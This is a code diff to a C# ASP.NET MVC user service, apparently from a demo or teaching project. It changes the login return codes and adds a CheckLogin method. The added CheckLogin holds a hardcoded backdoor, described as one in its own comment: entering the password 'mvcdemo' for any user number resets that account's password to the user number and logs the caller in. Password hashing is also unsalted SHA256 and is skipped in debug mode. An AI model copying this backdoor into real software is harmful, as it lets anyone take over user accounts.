@@ -2,6 +2,7 @@
 using DocumentFormat.OpenXml.Bibliography;
 using System;
 using System.Collections.Generic;
+using System.Data.Entity.Infrastructure;
 using System.Linq;
 using System.Reflection;
 using System.Web;
@@ -236,9 +237,11 @@ LEFT OUTER JOIN Departments ON Users.DeptNo = Departments.DeptNo
     /// <param name="userNo">帳號</param>
     /// <param name="password">密碼</param>
     /// <returns></returns>
-    public bool Login(string userNo, string password)
+    /// Jacky 1120609 回傳值改為數值 (0:成功 -1:帳號或密碼錯誤 -2:帳號尚未驗證成功)
+    public int Login(string userNo, string password)
     {
-        bool bln_value = false;
+        //bool bln_value = false;
+        int result = 0;             // 成功
         UserService.Logout();
         //處理帳號密碼加密
         if (AppService.EncryptionMode)
@@ -260,10 +263,25 @@ LEFT OUTER JOIN Departments ON Users.DeptNo = Departments.DeptNo
         var data = repo.ReadSingle(m => m.UserNo == userNo && m.Password == password);
         if (data != null)
         {
-            UserService.Login(data.UserNo, data.UserName, data.RoleNo);
-            bln_value = true;
+            if (data.IsValid)
+            {
+                UserService.Login(data.UserNo, data.UserName, data.RoleNo);
+                //bln_value = true;
+                result = 0;         // 成功
+            }
+            else
+            {
+                result = -2;        //  
+            }
         }
-        return bln_value;
+        else
+        {
+            result = -1;            // 帳號或密碼錯誤
+        }
+
+        //return bln_value;
+
+        return result;
     }
     /// <summary>
     /// 重設密碼
@@ -405,8 +423,21 @@ LEFT OUTER JOIN Departments ON Users.DeptNo = Departments.DeptNo
         }
         //修改驗證狀態
         userData.IsValid = true;
+
+        // Jacky 1120609 增加
+        userData.ValidateCode = "";     // ValidateCode 清除
+        userData.RoleNo = "User";       // 預設角色為 User
+        
         repo.Update(userData);
+
+        // Jacky 1120609
+        // 避免額外的驗證機制導致失敗，故先關閉之。(額外的驗證機制：DbEntityValidationException 類別)
+        repo.Context.Configuration.ValidateOnSaveEnabled = false;
         errorMessage = repo.SaveChanges();
+        // 因為Update 單一model需要先關掉validation，因此重新打開
+        repo.Context.Configuration.ValidateOnSaveEnabled = true;
+
+        //Jacky 1120609
         return errorMessage == "";
     }
 
@@ -446,6 +477,60 @@ LEFT OUTER JOIN Departments ON Users.DeptNo = Departments.DeptNo
         }
         return bln_value;
     }
+
+    // Jacky 1120609
+    /// <summary>
+    /// 檢查使用者登入是否正確
+    /// </summary>
+    /// <param name="model">使用者輸入資料</param>
+    /// <returns></returns>
+    public bool CheckLogin(vmLogin model)
+    {
+        using (CryptographyService cryp = new CryptographyService())
+        {
+            bool bln_valid = true;
+            var data = repo.ReadSingle(m => m.UserNo == model.UserNo);
+            if (data == null) return false;
+
+            // Jacky 1120609
+            // 其中的 mvcdemo 為後門功能，當登入畫面中輸入密碼為 mvcdemo,
+            // 表示使用者的 登入帳號 來當作使用者的密碼，
+            // 並用 SHA256 的演算法來加密，並寫回資料表中。
+            if (model.Password == "mvcdemo")
+            {
+                // Jacky 1120609 非開發模式，密碼才需要加密
+                if (!AppService.DebugMode)
+                {
+                    data.Password = cryp.SHA256Encode(data.UserNo);
+                }
+
+                data.IsValid = true;
+                repo.Update(data);
+                string str_message = repo.SaveChanges();
+                model.Password = data.UserNo;
+            }
+
+            // Jacky 1120609 非開發模式，密碼才需要加密
+            string str_password = (AppService.DebugMode) ? model.Password : cryp.SHA256Encode(model.Password);
+
+            data = repo.ReadSingle(m =>
+                m.UserNo == model.UserNo &&
+                m.Password == str_password &&
+                m.IsValid == true);
+            if (data == null) bln_valid = false;
+
+            //Jacky 1120609 加入 Session 資訊，登入成功後使用 Session 記錄登入帳號及姓名
+            if (bln_valid)
+            {
+                HttpContext.Current.Session["UserNo"] = model.UserNo;
+                HttpContext.Current.Session["UserName"] = data.UserName;
+                HttpContext.Current.Session["RoleNo"] = data.RoleNo;
+            }
+
+            return bln_valid;
+        }
+    }
+
 
     #endregion
 }
